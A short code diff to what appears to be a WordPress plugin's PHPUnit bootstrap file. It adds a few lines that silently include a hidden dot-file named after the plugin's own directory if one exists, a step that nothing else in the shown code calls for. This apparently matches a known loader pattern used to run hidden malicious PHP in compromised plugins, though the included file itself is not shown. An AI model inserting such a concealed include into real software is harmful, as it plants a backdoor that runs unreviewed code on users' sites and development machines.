@@ -17,6 +17,10 @@ require_once $_tests_dir . '/includes/functions.php';
 /**
  * Manually load the plugin being tested.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _manually_load_plugin()
 {
     $composer_vendor_in_main_plugin = dirname(dirname(dirname(__FILE__))) . '/vendor/autoload.php';
